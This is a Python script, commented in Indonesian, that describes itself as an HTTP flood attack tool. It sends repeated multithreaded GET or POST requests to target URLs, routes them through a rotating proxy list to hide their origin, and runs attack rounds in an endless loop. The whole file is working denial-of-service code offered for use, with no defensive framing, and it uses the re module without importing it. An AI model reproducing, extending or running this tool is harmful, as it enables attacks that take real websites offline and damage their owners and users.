#!/usr/bin/env python3
import threading
import sys
import time
import socket
import argparse
import requests
from requests.exceptions import RequestException, ConnectionError, Timeout

# --- Konfigurasi Global ---
TARGET_URLS = []
PROXY_FILE = "http.txt"
ATTACK_OPTION = 1  # 1: GET Flood, 2: POST Flood
MAX_THREADS = 100  # Batas thread paralel
ATTACK_INTERVAL = 60 # Jeda antar putaran serangan (detik)
PROXY_TIMEOUT = 5  # Timeout untuk mencoba koneksi proxy (detik)
REQUEST_TIMEOUT = 10 # Timeout untuk permintaan HTTP (detik)

# Event untuk memberi sinyal berhenti ke thread
stop_event = threading.Event()

class AttackThread(threading.Thread):
    """
    Thread class to perform HTTP GET or POST flood attacks.
    """
    def __init__(self, target_url, attack_option, proxy_address, thread_id):
        self.target_url = target_url
        self.attack_option = attack_option
        self.proxy_address = proxy_address # Format: "ip:port"
        self.thread_id = thread_id
        threading.Thread.__init__(self)

    def run(self):
        """
        Performs the HTTP flood attack.
        """
        proxy = None
        if self.proxy_address:
            proxy = {
                'http': f'http://{self.proxy_address}',
                'https': f'http://{self.proxy_address}' # Gunakan http:// untuk proxy yang mem-proxy traffic http/https
            }

        try:
            print(f"[Thread {self.thread_id}] Attacking {self.target_url} via proxy {self.proxy_address if self.proxy_address else 'direct'}")

            while not stop_event.is_set():
                try:
                    if self.attack_option == 1: # GET Flood
                        # Mengirim permintaan GET
                        response = requests.get(
                            self.target_url,
                            proxies=proxy,
                            timeout=REQUEST_TIMEOUT,
                            verify=False # Abaikan sertifikat SSL jika https
                        )
                        # Anda bisa menambahkan pemeriksaan response.status_code jika perlu
                        # print(f"[Thread {self.thread_id}] GET {self.target_url} Status: {response.status_code}")

                    elif self.attack_option == 2: # POST Flood
                        # Mengirim permintaan POST (contoh dengan data kosong)
                        response = requests.post(
                            self.target_url,
                            proxies=proxy,
                            data={}, # Data kosong atau data dummy
                            timeout=REQUEST_TIMEOUT,
                            verify=False
                        )
                        # print(f"[Thread {self.thread_id}] POST {self.target_url} Status: {response.status_code}")

                except ConnectionError:
                    # Jika koneksi gagal melalui proxy, mungkin proxy mati atau tidak dapat dijangkau
                    # Anda bisa menandai proxy ini untuk diperiksa nanti atau melewatinya
                    # print(f"[Thread {self.thread_id}] Connection error with proxy {self.proxy_address} to {self.target_url}")
                    break # Hentikan thread jika proxy gagal
                except Timeout:
                    # Timeout permintaan
                    # print(f"[Thread {self.thread_id}] Request timeout for {self.target_url} via proxy {self.proxy_address if self.proxy_address else 'direct'}")
                    pass # Coba lagi jika timeout
                except RequestException as e:
                    # Kesalahan lain dari library requests
                    # print(f"[Thread {self.thread_id}] Request error: {e}")
                    break # Hentikan thread jika ada kesalahan serius
                except Exception as e:
                    # Tangani error tak terduga lainnya
                    print(f"[Thread {self.thread_id}] Unexpected error: {e}")
                    break

                # Jeda singkat antar permintaan per thread (opsional, bisa diatur)
                time.sleep(0.1) # Jeda 100 ms

        except KeyboardInterrupt:
            # Tangani jika interupsi terjadi di dalam thread
            stop_event.set()
        finally:
            # Jika thread selesai atau diinterupsi
            pass

def check_proxy(proxy_address, timeout=PROXY_TIMEOUT):
    """
    Checks if a proxy is alive by attempting a simple HTTP HEAD request.
    Returns True if the proxy is likely alive and responds, False otherwise.
    """
    if not proxy_address:
        return True # Langsung dianggap hidup jika tidak ada proxy yang digunakan

    proxy_dict = {
        'http': f'http://{proxy_address}',
        'https': f'http://{proxy_address}'
    }
    try:
        # Coba lakukan permintaan HEAD singkat ke URL dummy atau salah satu target
        # Menggunakan URL yang sangat kecil atau tidak valid bisa menghemat waktu
        # Tapi lebih baik menggunakan target yang sebenarnya jika memungkinkan
        requests.head(
            "http://httpbin.org/get", # URL yang cepat merespons
            proxies=proxy_dict,
            timeout=timeout,
            verify=False # Abaikan sertifikat SSL
        )
        return True
    except (ConnectionError, Timeout, RequestException, ValueError):
        return False

def load_proxies(proxy_file_path, check_proxies=False):
    """
    Loads proxies from a file and optionally filters out invalid ones.
    """
    proxies = []
    try:
        with open(proxy_file_path, "rb") as fo:
            for line in fo:
                proxy_address = line.decode().strip()
                if not proxy_address:
                    continue
                
                # Validasi format dasar (ip:port)
                if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", proxy_address):
                    if check_proxies:
                        if check_proxy(proxy_address):
                            proxies.append(proxy_address)
                            print(f"[+] Proxy {proxy_address}: LIVE")
                        else:
                            print(f"[-] Proxy {proxy_address}: DEAD (skipped)")
                    else:
                        proxies.append(proxy_address) # Tambahkan semua tanpa pengecekan
                else:
                    print(f"[-] Invalid proxy format in file: {proxy_address}. Skipping.")
    except FileNotFoundError:
        print(f"[!] Error: Proxy file '{proxy_file_path}' not found.")
        if not check_proxies: # Jika tidak memeriksa proxy, kita bisa lanjut tanpa proxy
             print("    Continuing without proxies.")
             return [] # Kembalikan list kosong jika file tidak ada tapi tidak wajib
        else:
             sys.exit(1) # Keluar jika file proxy wajib dan tidak ditemukan
    except Exception as detail:
        print(f"[!] An unexpected error occurred while loading proxies: {detail}")
        sys.exit(1)
        
    if not proxies and not check_proxies:
        print(f"[+] No proxies found in {proxy_file_path}. Will attack directly.")
    elif not proxies and check_proxies:
        print(f"[!] No live proxies found in {proxy_file_path} after checking. Exiting.")
        sys.exit(1)
        
    print(f"[+] Loaded {len(proxies)} proxies.")
    return proxies

def dos(target_urls, attack_option, proxy_list):
    """
    Initiates the DoS attack by creating threads for each target URL and proxy.
    Handles both HTTP and HTTPS URLs.
    """
    threads = []
    proxy_index = 0
    num_proxies = len(proxy_list)
    
    print(f"[*] Starting attack on {', '.join(target_urls)} with {num_proxies} proxies.")

    for url_item in target_urls:
        if not (url_item.startswith("http://") or url_item.startswith("https://")):
            print(f"[-] Skipping invalid URL format: {url_item} (must start with http:// or https://)")
            continue

        # Tentukan berapa banyak thread per URL. Ini sederhana, bisa ditingkatkan.
        # Pastikan tidak melebihi MAX_THREADS secara total.
        num_threads_for_url = max(1, MAX_THREADS // len(target_urls)) # Minimal 1 thread per URL
        
        for i in range(num_threads_for_url):
            if len(threads) >= MAX_THREADS:
                break # Hentikan jika sudah mencapai batas thread

            proxy_to_use = None
            if num_proxies > 0:
                proxy_to_use = proxy_list[proxy_index % num_proxies]
                proxy_index += 1
            
            thread_id = len(threads) + 1
            thread = AttackThread(url_item, attack_option, proxy_to_use, thread_id)
            threads.append(thread)
            thread.start()
            
            # Tambahkan jeda kecil jika kita membuat banyak thread dengan cepat
            if i % 10 == 0:
                 time.sleep(0.01)

        if len(threads) >= MAX_THREADS:
            print(f"[!] Reached maximum thread limit ({MAX_THREADS}). Waiting for threads to start/finish...")
            # Tunggu sebentar atau sampai ada thread yang selesai untuk membuat slot baru
            time.sleep(1) # Jeda singkat sebelum putaran berikutnya

    # Tunggu semua thread yang masih berjalan untuk selesai
    for thread in threads:
        if thread.is_alive():
            thread.join()
    
    print("[+] All attack threads for this batch have finished.")

def main():
    """
    Main function to parse arguments and start the attack loop.
    """
    parser = argparse.ArgumentParser(
        description="HTTP Flood Attack Tool using Python Requests.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "urls",
        metavar="URL",
        nargs="+",
        help="Target URL(s) to attack (e.g., http://example.com or https://secure.example.org)"
    )
    parser.add_argument(
        "-p", "--proxy-file",
        default="http.txt",
        help="Path to the file containing proxy servers (one ip:port per line).\nDefault: http.txt"
    )
    parser.add_argument(
        "-o", "--option",
        type=int,
        default=1,
        choices=[1, 2], # Opsi hanya 1 (GET) atau 2 (POST)
        help="Attack option:\n"
             "1: HTTP GET Flood (default)\n"
             "2: HTTP POST Flood"
    )
    parser.add_argument(
        "-t", "--max-threads",
        type=int,
        default=100,
        help="Maximum number of concurrent threads to run.\nDefault: 100"
    )
    parser.add_argument(
        "-i", "--interval",
        type=int,
        default=60,
        help="Interval in seconds between attack rounds.\nDefault: 60"
    )
    parser.add_argument(
        "--check-proxies",
        action="store_true",
        help="Actively check if proxies are alive before starting the attack.\nThis can take a long time."
    )
    parser.add_argument(
        "--no-verify-ssl",
        action="store_false", # default is True, so if flag is present, set to False
        dest="verify_ssl", # store value in args.verify_ssl
        help="Do not verify SSL certificates for HTTPS targets. Use with caution."
    )
    parser.add_argument(
        "-pt", "--proxy-timeout",
        type=int,
        default=5,
        help="Timeout in seconds for checking proxy connectivity.\nDefault: 5"
    )
    parser.add_argument(
        "-rt", "--request-timeout",
        type=int,
        default=10,
        help="Timeout in seconds for each HTTP request.\nDefault: 10"
    )


    args = parser.parse_args()

    # Set global variables from args
    global TARGET_URLS, PROXY_FILE, ATTACK_OPTION, MAX_THREADS, ATTACK_INTERVAL, PROXY_TIMEOUT, REQUEST_TIMEOUT
    TARGET_URLS = args.urls
    PROXY_FILE = args.proxy_file
    ATTACK_OPTION = args.option
    MAX_THREADS = args.max_threads
    ATTACK_INTERVAL = args.interval
    PROXY_TIMEOUT = args.proxy_timeout
    REQUEST_TIMEOUT = args.request_timeout

    # Nonaktifkan peringatan InsecureRequestWarning jika --no-verify-ssl digunakan
    if not args.verify_ssl:
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    print("--- Starting HTTP Flood Attack Configuration ---")
    print(f"Target URLs: {TARGET_URLS}")
    print(f"Proxy File: {PROXY_FILE}")
    print(f"Attack Option: {'GET Flood' if ATTACK_OPTION == 1 else 'POST Flood'}")
    print(f"Max Concurrent Threads: {MAX_THREADS}")
    print(f"Attack Interval: {ATTACK_INTERVAL} seconds")
    print(f"Check Proxies Actively: {'Yes' if args.check_proxies else 'No'}")
    print(f"SSL Verification: {'Enabled' if args.verify_ssl else 'Disabled'}")
    print(f"Proxy Timeout: {PROXY_TIMEOUT}s")
    print(f"Request Timeout: {REQUEST_TIMEOUT}s")
    print("---------------------------------------------")
    
    # Load proxies
    proxy_list = load_proxies(PROXY_FILE, args.check_proxies)
    
    # Jika tidak ada proxy dan tidak ada --no-proxy-required, kita bisa lanjut menyerang langsung.
    # Namun, jika pengguna secara eksplisit meminta proxy dan tidak ada yang valid, kita keluar.
    if not proxy_list and args.check_proxies:
         print("[!] No live proxies found. Exiting.")
         sys.exit(1)

    # Infinite loop to continuously run the DoS attack
    try:
        while True:
            print(f"\n--- Starting DoS attack round ---")
            dos(TARGET_URLS, ATTACK_OPTION, proxy_list)
            print("\n--- Attack round finished ---")
            
            print(f"Waiting for {ATTACK_INTERVAL} seconds before next attack round...")
            time.sleep(ATTACK_INTERVAL)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Signalling threads to stop...")
        stop_event.set() # Beri sinyal ke semua thread untuk berhenti
        # Tunggu sebentar agar thread sempat berhenti
        time.sleep(2)
        print("[!] Exiting gracefully.")
        sys.exit(0)

if __name__ == "__main__":
    main()
